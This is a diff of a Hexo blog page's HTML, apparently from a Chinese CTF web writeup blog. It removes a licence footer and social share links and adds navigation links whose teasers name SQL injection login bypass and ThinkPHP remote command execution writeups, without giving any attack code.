data-srcset="https://img-blog.csdnimg.cn/20201215220342689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"></p>
 
   
   
-    
-    <div class='footer'>
-      
-      
-      
-        <div class='copyright'>
-          <blockquote>
-            
-              
-                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
-
-              
-            
-              
-                <p>本文永久链接是：<a href=http://example.com/2021/03/08/ctfweb/>http://example.com/2021/03/08/ctfweb/</a></p>
-              
-            
-          </blockquote>
-        </div>
-      
-      
-    </div>
-  
-  
-    
-
-
-  <div class='article-meta' id="bottom">
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-08T10:37:17+08:00">
-  <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 8, 2021</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-
-        
-      
-        
-          
-  <div class="new-meta-item share -mob-share-list">
-  <div class="-mob-share-list share-body">
-    
-      
-        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
-          
-        </a>
-      
-    
-      
-    
-      
-    
-  </div>
-</div>
-
-
-
-        
-      
-    </div>
-  </div>
-
-
   
   
 
   
     <div class="prev-next">
       
+        <a class='prev' href='/2021/03/10/ctf.show%20web%E5%8C%BA/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ctf.show</p>
+          <p class='content'>web签到题本题考查信息搜集，F12查看源代码，base64得到flag
+web2题目提示为最简单的sql注入，burp抓包开始SQL注入测试，利用万能密码，登录成功ps：PHP万能密码绕过，例...</p>
+        </a>
       
-        <a class='next' href='/2021/03/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/'>
-          <p class='title'>攻防世界新手区题解<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 本题打开网页查看源代码即得到flag 2.robots：X老师上课讲了Robots协议，小...</p>
+      
+        <a class='next' href='/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/'>
+          <p class='title'>攻防世界高手区题解<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1.
+      index.php还是跳回1.php，但是已经可以看到flag2.Training-WWW-Robots
+3.php_rceThinkPHP 5.x远程命令执行漏洞分析与复现h...</p>
         </a>
       
     </div>
@@ -987,8 +513,8 @@ JAVAweb应用目录
 
 <script>
   window.pdata={}
-  pdata.ispage=true;
-  pdata.postTitle="ctfweb";
+  pdata.ispage=false;
+  pdata.postTitle="";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
